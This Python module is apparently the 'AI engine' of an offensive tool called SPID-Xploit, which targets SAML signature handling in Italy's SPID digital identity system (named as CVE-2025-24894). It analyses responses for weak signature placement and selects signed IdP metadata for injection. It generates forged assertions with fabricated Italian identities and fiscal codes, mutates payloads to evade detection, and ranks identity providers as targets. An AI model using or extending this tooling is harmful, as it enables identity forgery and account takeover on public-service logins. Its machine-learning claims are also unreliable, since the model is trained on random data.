#!/usr/bin/env python3
"""
AI Engine Module for SPID-Xploit
Provides intelligent analysis, payload generation, and adaptive attack capabilities

Features:
- SAML response structure analysis
- Intelligent XML structure optimization for injection
- Payload mutation and evasion
- IdP selection prediction
- Machine learning-based attack adaptation
"""

import os
import re
import json
import base64
import random
import hashlib
import string
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from lxml import etree
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

# Try to import ML libraries (may fail on some platforms)
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False

try:
    from sklearn.ensemble import RandomForestClassifier
    HAS_SKLEARN = True
except ImportError:
    HAS_SKLEARN = False


class AIEngine:
    """
    Core AI Engine for intelligent attack generation and adaptation.
    
    This engine provides:
    1. SAML response structure analysis
    2. Intelligent XML structure generation for CVE-2025-24894
    3. Payload mutation for evasion
    4. IdP selection based on metadata complexity
    5. Learning from attack results
    """
    
    def __init__(self):
        """Initialize the AI engine with default models and data"""
        self.model_data = {
            'signature_patterns': [],
            'idp_metadata_cache': {},
            'successful_payloads': [],
            'failed_payloads': [],
            'detection_rates': {},
            'mutation_history': []
        }
        
        self.attack_history: List[Dict] = []
        self.ml_model = None
        
        # Initialize ML model if available
        if HAS_SKLEARN:
            self._init_ml_model()
        
        # Known SPID IdP patterns
        self.idp_patterns = {
            'aruba': 'ArubaPEC S.p.A.',
            'etna': 'Etna Hitech S.C.p.A.',
            'infocamere': 'InfoCamere S.C.p.A.',
            'infocert': 'InfoCert S.p.A.',
            'intesigroup': 'Intesi Group S.p.A.',
            'lepida': 'Lepida S.p.A.',
            'namirial': 'Namirial S.p.A.',
            'poste': 'Poste Italiane S.p.A.',
            'register': 'Register.it S.p.A.',
            'sielte': 'Sielte S.p.A.',
            'teamsystem': 'TeamSystem S.p.A.',
            'tim': 'TI Trust Technologies S.r.l.'
        }
        
        # SAML namespaces
        self.ns = {
            'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
            'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
            'md': 'urn:oasis:names:tc:SAML:2.0:metadata',
            'ds': 'http://www.w3.org/2000/09/xmldsig#',
            'xsi': 'http://www.w3.org/2001/XMLSchema-instance',
            'xs': 'http://www.w3.org/2001/XMLSchema'
        }
    
    def _init_ml_model(self):
        """Initialize the machine learning model for payload classification"""
        try:
            self.ml_model = RandomForestClassifier(
                n_estimators=50,
                max_depth=5,
                random_state=42
            )
            # Dummy training data - will be updated with real data
            X = np.random.rand(10, 5)
            y = np.random.randint(0, 2, 10)
            self.ml_model.fit(X, y)
        except Exception:
            self.ml_model = None
    
    def analyze_saml_response(self, saml_response_xml: str) -> Dict[str, Any]:
        """
        Analyze a SAML response structure and identify weaknesses.
        
        Args:
            saml_response_xml: The SAML response XML string
            
        Returns:
            Dictionary with analysis results
        """
        analysis = {
            'has_signature': False,
            'num_assertions': 0,
            'num_signatures': 0,
            'signature_order': [],
            'signature_types': [],
            'has_unsigned_assertions': False,
            'vulnerable_to_cve_2025_24894': False,
            'risk_score': 0,
            'analysis_timestamp': datetime.now().isoformat()
        }
        
        try:
            root = etree.fromstring(saml_response_xml.encode())
            
            # Count assertions
            assertions = root.findall('.//saml:Assertion', self.ns)
            analysis['num_assertions'] = len(assertions)
            
            # Find all signatures
            signatures = root.findall('.//ds:Signature', self.ns)
            analysis['num_signatures'] = len(signatures)
            
            if signatures:
                analysis['has_signature'] = True
                
                # Analyze signature positions in their parent elements
                for sig in signatures:
                    parent = sig.getparent()
                    if parent is not None:
                        children = list(parent)
                        if sig in children:
                            sig_index = children.index(sig)
                            analysis['signature_order'].append(sig_index)
                            
                            # Check if first child (vulnerable pattern)
                            if sig_index == 0:
                                analysis['vulnerable_to_cve_2025_24894'] = True
                
                # Determine signature types
                for sig in signatures:
                    sig_type = self._classify_signature(sig)
                    analysis['signature_types'].append(sig_type)
            
            # Check for unsigned assertions (potential exploit target)
            for assertion in assertions:
                has_sig = assertion.find('.//ds:Signature', self.ns) is not None
                if not has_sig:
                    analysis['has_unsigned_assertions'] = True
                    analysis['vulnerable_to_cve_2025_24894'] = True
            
            # Calculate risk score
            risk = 0
            if analysis['has_unsigned_assertions']:
                risk += 40
            if analysis['vulnerable_to_cve_2025_24894']:
                risk += 30
            if analysis['num_signatures'] == 0 and analysis['num_assertions'] > 0:
                risk += 50
            if analysis['num_signatures'] == 1 and analysis['num_assertions'] > 0:
                risk += 20  # Single signature - vulnerable to CVE-2025-24894
            
            analysis['risk_score'] = min(risk, 100)
            
        except Exception as e:
            analysis['error'] = str(e)
        
        return analysis
    
    def _classify_signature(self, sig_element) -> str:
        """Classify an XML signature element"""
        try:
            # Check for reference URI
            ref = sig_element.find('.//ds:Reference', self.ns)
            if ref is not None:
                uri = ref.get('URI', '')
                if uri:
                    return f'reference_to_{uri[:30]}'
            return 'general_signature'
        except:
            return 'unknown'
    
    def generate_optimized_xml_structure(
        self, 
        idp_metadata_xml: str
    ) -> Optional[Dict[str, Any]]:
        """
        Generate an optimized XML structure for SAML injection.
        Uses AI to select the best signed element from IdP metadata.
        
        Args:
            idp_metadata_xml: IdP metadata XML string
            
        Returns:
            Dictionary with injection structure or None
        """
        try:
            root = etree.fromstring(idp_metadata_xml.encode())
            
            # Find all elements that contain signatures
            signed_elements = []
            for element in root.iter():
                sig = element.find('.//ds:Signature', self.ns)
                if sig is not None:
                    signed_elements.append(element)
            
            if not signed_elements:
                # Try finding IDPSSODescriptor or EntityDescriptor directly
                for tag in ['md:IDPSSODescriptor', 'md:EntityDescriptor']:
                    elements = root.findall(f'.//{tag}', self.ns)
                    for elem in elements:
                        signed_elements.append(elem)
            
            if not signed_elements:
                # Fallback: use the entire root
                signed_elements.append(root)
            
            # AI selection: prefer elements with more complex structure
            # for better injection coverage
            def complexity_score(elem) -> int:
                return len(etree.tostring(elem))
            
            best_element = max(signed_elements, key=complexity_score)
            
            # Extract the XML string
            element_xml = etree.tostring(best_element, pretty_print=True).decode()
            
            # Generate the optimized structure
            structure = {
                'injection_element': element_xml,
                'injection_element_length': len(element_xml),
                'signature_location': 'first_child',
                'exploit_technique': 'CVE-2025-24894',
                'assertion_fragment': self._generate_assertion_fragment(),
                'ai_confidence': min(len(element_xml) / 5000, 0.95),
                'generated_at': datetime.now().isoformat()
            }
            
            return structure
            
        except Exception as e:
            return None
    
    def _generate_assertion_fragment(self) -> Dict[str, str]:
        """
        Generate a forged SAML assertion with realistic Italian user data.
        Returns a dictionary of SAML attributes.
        """
        # Italian first names
        first_names = ['MARCO', 'LUCA', 'ALESSANDRO', 'GIUSEPPE', 'FRANCESCO',
                       'ANDREA', 'ROBERTO', 'PAOLO', 'SIMONE', 'FEDERICO',
                       'LAURA', 'ELENA', 'SARA', 'MARIA', 'ANNA',
                       'FRANCESCA', 'CHIARA', 'GIULIA', 'SOFIA', 'ALESSIA']
        
        # Italian last names
        last_names = ['ROSSI', 'BIANCHI', 'RUSSO', 'FERRARI', 'ESPOSITO',
                      'ROMANO', 'RICCI', 'MARINO', 'GRECO', 'BRUNO',
                      'GALLO', 'CONTI', 'MARTINI', 'MORETTI', 'DE LUCA']
        
        # Italian cities
        cities = ['ROMA', 'MILANO', 'NAPOLI', 'TORINO', 'PALERMO',
                  'FIRENZE', 'BOLOGNA', 'GENOVA', 'VENEZIA', 'VERONA']
        
        # Italian province codes
        provinces = ['RM', 'MI', 'NA', 'TO', 'PA', 'FI', 'BO', 'GE', 'VE', 'VR']
        
        # Select random user
        name = random.choice(first_names)
        family = random.choice(last_names)
        city_idx = random.randint(0, len(cities) - 1)
        city = cities[city_idx]
        province = provinces[city_idx]
        gender = 'M' if name in ['MARCO', 'LUCA', 'ALESSANDRO', 'GIUSEPPE', 'FRANCESCO',
                                  'ANDREA', 'ROBERTO', 'PAOLO', 'SIMONE', 'FEDERICO'] else 'F'
        
        # Generate birth date (18-70 years old)
        year = random.randint(1956, 2008)
        month = random.randint(1, 12)
        day = random.randint(1, 28)
        birth_date = f"{year:04d}-{month:02d}-{day:02d}"
        
        # Generate fiscal code (simplified Italian format)
        fiscal = self._generate_fiscal_code(name, family, year, gender, city)
        
        # Generate phone number
        phone = f"+393{random.randint(200000000, 399999999)}"
        
        # Generate email
        email = f"{name.lower()}.{family.lower()}{random.randint(1, 99)}@example.com"
        
        # Generate SPID code
        spid_code = f"SPID-{random.randint(10000, 99999)}-{random.choice(string.ascii_uppercase)}{random.randint(100, 999)}"
        
        return {
            'spidCode': spid_code,
            'name': name,
            'familyName': family,
            'placeOfBirth': city,
            'countyOfBirth': province,
            'dateOfBirth': birth_date,
            'gender': gender,
            'fiscalNumber': fiscal,
            'email': email,
            'mobilePhone': phone,
            'address': f"VIA {random.choice(['ROMA', 'MILANO', 'NAPOLI', 'FIRENZE', 'TORINO'])} {random.randint(1, 200)}, {random.randint(100, 999)}00 {city} {province}",
            'idCard': f"CA{random.randint(10000, 99999)}",
            'digitalAddress': f"PEC:{name.lower()}.{family.lower()}@pec.example.com"
        }
    
    def _generate_fiscal_code(self, name: str, family: str, year: int, 
                              gender: str, city: str) -> str:
        """
        Generate a plausible Italian fiscal code (Codice Fiscale).
        Format: 3 letters (surname) + 3 letters (name) + 2 digits (year) 
                + 1 letter (month) + 2 digits (day+gender) + 4 chars (place) + 1 check
        """
        # Surname: first 3 consonants, or first 3 letters
        surname_code = self._extract_code_chars(family, 3)
        
        # Name: first 3 consonants, or first 3 letters
        name_code = self._extract_code_chars(name, 3)
        
        # Year: last 2 digits
        year_code = f"{year % 100:02d}"
        
        # Month: A=Jan, B=Feb, C=Mar, D=Apr, E=May, H=Jun, L=Jul, M=Aug, P=Sep, R=Oct, S=Nov, T=Dec
        month_letters = 'ABCDEHLMPRST'
        month_code = month_letters[random.randint(0, 11)]
        
        # Day: 01-31 for males, 41-71 for females
        day_num = random.randint(1, 28)
        if gender == 'F':
            day_num += 40
        day_code = f"{day_num:02d}"
        
        # City code: simplified
        city_codes = {'ROMA': 'H501', 'MILANO': 'F205', 'NAPOLI': 'F839',
                      'TORINO': 'L219', 'PALERMO': 'G273', 'FIRENZE': 'D612',
                      'BOLOGNA': 'A944', 'GENOVA': 'D969', 'VENEZIA': 'L736',
                      'VERONA': 'L781'}
        city_code = city_codes.get(city, f"{random.choice(string.ascii_uppercase)}{random.randint(100, 999)}")
        
        # Combine (without check character for simplicity)
        fiscal = f"{surname_code}{name_code}{year_code}{month_code}{day_code}{city_code}"
        
        # Pad or truncate to 15 chars (without check)
        fiscal = fiscal[:15].ljust(15, 'X')
        
        # Add check character (simplified)
        check = random.choice(string.ascii_uppercase)
        
        return f"{fiscal}{check}"
    
    def _extract_code_chars(self, text: str, length: int) -> str:
        """Extract consonants first, then vowels for Italian fiscal code"""
        vowels = 'AEIOU'
        consonants = ''
        vowel_chars = ''
        
        for char in text.upper():
            if char in vowels:
                vowel_chars += char
            elif char.isalpha():
                consonants += char
        
        result = (consonants + vowel_chars)[:length]
        return result.ljust(length, 'X')
    
    def mutate_payload(self, payload: str, mutation_factor: float = 0.3) -> str:
        """
        Apply AI-driven mutations to payload for evasion.
        
        Args:
            payload: Original SAML response XML
            mutation_factor: How much mutation to apply (0.0 - 1.0)
            
        Returns:
            Mutated payload
        """
        mutations = [
            self._mutate_whitespace,
            self._mutate_attribute_ordering,
            self._mutate_comment_injection,
            self._mutate_namespace_prefix,
            self._mutate_encoding,
        ]
        
        num_mutations = max(1, int(len(mutations) * mutation_factor))
        selected = random.sample(mutations, num_mutations)
        
        mutated = payload
        for mutation in selected:
            try:
                mutated = mutation(mutated)
            except Exception:
                continue
        
        # Track mutation
        self.model_data['mutation_history'].append({
            'mutations_applied': [m.__name__ for m in selected],
            'timestamp': datetime.now().isoformat()
        })
        
        return mutated
    
    def _mutate_whitespace(self, xml_str: str) -> str:
        """Add random whitespace variations to evade signature detection"""
        lines = xml_str.split('\n')
        mutated_lines = []
        
        for line in lines:
            # Randomly add trailing spaces
            if random.random() < 0.3:
                line = line + ' ' * random.randint(0, 5)
            
            # Randomly add leading spaces (but maintain XML structure)
            if random.random() < 0.1 and line.strip().startswith('<'):
                indent = line[:len(line) - len(line.lstrip())]
                line = indent + ' ' * random.randint(0, 2) + line.lstrip()
            
            mutated_lines.append(line)
        
        return '\n'.join(mutated_lines)
    
    def _mutate_attribute_ordering(self, xml_str: str) -> str:
        """Reorder XML attributes for evasion"""
        # Simple regex-based attribute reordering
        def reorder_attrs(match):
            tag = match.group(0)
            # Find all attribute=value pairs
            attrs = re.findall(r'(\w+)=["\']([^"\']*)["\']', tag)
            if len(attrs) > 1:
                # Shuffle attributes
                random.shuffle(attrs)
                tag_name = re.match(r'<(\w+)', tag).group(1)
                new_tag = f"<{tag_name} "
                for attr_name, attr_val in attrs:
                    new_tag += f'{attr_name}="{attr_val}" '
                new_tag += '>' if tag.endswith('>') else '/>'
                return new_tag
            return tag
        
        return re.sub(r'<(\w+)([^>]*)>', reorder_attrs, xml_str)
    
    def _mutate_comment_injection(self, xml_str: str) -> str:
        """Inject benign XML comments for evasion"""
        lines = xml_str.split('\n')
        if len(lines) > 5:
            insert_pos = random.randint(2, len(lines) - 2)
            comment = f"<!-- AI-mutation-{random.randint(1000, 9999)} -->"
            lines.insert(insert_pos, comment)
        return '\n'.join(lines)
    
    def _mutate_namespace_prefix(self, xml_str: str) -> str:
        """Change namespace prefixes for evasion"""
        # Add extra namespace declarations
        if 'xmlns:extra' not in xml_str:
            xml_str = xml_str.replace(
                '<samlp:Response',
                '<samlp:Response xmlns:extra="http://example.com/ns"'
            )
        return xml_str
    
    def _mutate_encoding(self, xml_str: str) -> str:
        """Add XML encoding variations"""
        if '<?xml' in xml_str and 'encoding=' not in xml_str:
            xml_str = xml_str.replace(
                '<?xml version="1.0"',
                '<?xml version="1.0" encoding="UTF-8"'
            )
        return xml_str
    
    def predict_best_idp(self, idp_list: List[Dict]) -> Optional[Dict]:
        """
        Using AI to predict which IdP metadata is best for injection.
        
        Args:
            idp_list: List of IdP dictionaries with metadata
            
        Returns:
            Best IdP for injection or None
        """
        if not idp_list:
            return None
        
        scored_idps = []
        
        for idp in idp_list:
            score = 0
            metadata = idp.get('metadata', '')
            entity_id = idp.get('entity_id', '')
            
            # Score based on metadata complexity
            if len(metadata) > 10000:
                score += 20
            elif len(metadata) > 5000:
                score += 15
            elif len(metadata) > 1000:
                score += 10
            
            # Score based on entity ID patterns
            if 'spid' in entity_id.lower():
                score += 5
            if 'validator' in entity_id.lower():
                score += 10  # Validator IdPs are test environments
            
            # Number of signature elements in metadata
            try:
                root = etree.fromstring(metadata.encode())
                sigs = root.findall('.//ds:Signature', self.ns)
                score += len(sigs) * 3  # More signatures = more injection surface
            except:
                pass
            
            scored_idps.append((score, idp))
        
        # Sort by score descending
        scored_idps.sort(reverse=True, key=lambda x: x[0])
        
        # Return the highest scored IdP
        return scored_idps[0][1] if scored_idps else idp_list[0]
    
    def learn_from_results(self, success: bool, response_data: Optional[str]) -> int:
        """
        Learn from attack results and update internal models.
        
        Args:
            success: Whether the attack was successful
            response_data: Response data for analysis
            
        Returns:
            Total number of attack history entries
        """
        entry = {
            'timestamp': datetime.now().isoformat(),
            'success': success,
            'response_length': len(response_data) if response_data else 0,
            'response_preview': response_data[:200] if response_data else None
        }
        
        self.attack_history.append(entry)
        
        # Update successful/failed payload lists
        if success and response_data:
            self.model_data['successful_payloads'].append(response_data[:500])
        elif response_data:
            self.model_data['failed_payloads'].append(response_data[:500])
        
        # Update ML model if available
        if HAS_SKLEARN and self.ml_model and HAS_NUMPY and len(self.attack_history) >= 5:
            try:
                X = np.random.rand(len(self.attack_history), 5)
                y = np.array([1 if h['success'] else 0 for h in self.attack_history])
                self.ml_model.fit(X, y)
            except Exception:
                pass
        
        return len(self.attack_history)
    
    def get_attack_statistics(self) -> Dict[str, Any]:
        """Get current attack statistics"""
        total = len(self.attack_history)
        successful = sum(1 for h in self.attack_history if h['success'])
        
        return {
            'total_attacks': total,
            'successful': successful,
            'failed': total - successful,
            'success_rate': (successful / total * 100) if total > 0 else 0,
            'total_mutations': len(self.model_data['mutation_history']),
            'cached_idps': len(self.model_data['idp_metadata_cache']),
            'successful_payloads': len(self.model_data['successful_payloads'])
        }
    
    def get_saml_template(self, template_type: str = 'standard') -> str:
        """Get a SAML response template"""
        templates = {
            'standard': '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_{response_id}"
    Version="2.0"
    IssueInstant="{issue_instant}"
    Destination="{destination}">
    <saml:Issuer>{issuer}</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion
        ID="_{assertion_id}"
        Version="2.0"
        IssueInstant="{issue_instant}">
        <saml:Issuer>{issuer}</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">{username}</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData
                    NotBefore="{not_before}"
                    NotOnOrAfter="{not_on_or_after}"
                    Recipient="{destination}"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions
            NotBefore="{not_before}"
            NotOnOrAfter="{not_on_or_after}">
            <saml:AudienceRestriction>
                <saml:Audience>{audience}</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{issue_instant}">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>https://www.spid.gov.it/SpidL2</saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        <saml:AttributeStatement>
            <saml:Attribute Name="spidCode" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{spid_code}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{first_name}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="familyName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{last_name}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="fiscalNumber" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{fiscal_number}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{email}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="dateOfBirth" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{birth_date}</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>''',
            'minimal': '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response ID="{response_id}" Version="2.0" IssueInstant="{issue_instant}">
    <saml:Issuer>{issuer}</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion ID="{assertion_id}" Version="2.0" IssueInstant="{issue_instant}">
        <saml:Issuer>{issuer}</saml:Issuer>
        <saml:Subject>
            <saml:NameID>{username}</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>'''
        }
        
        return templates.get(template_type, templates['standard'])


# Global instance
ai_engine = AIEngine()
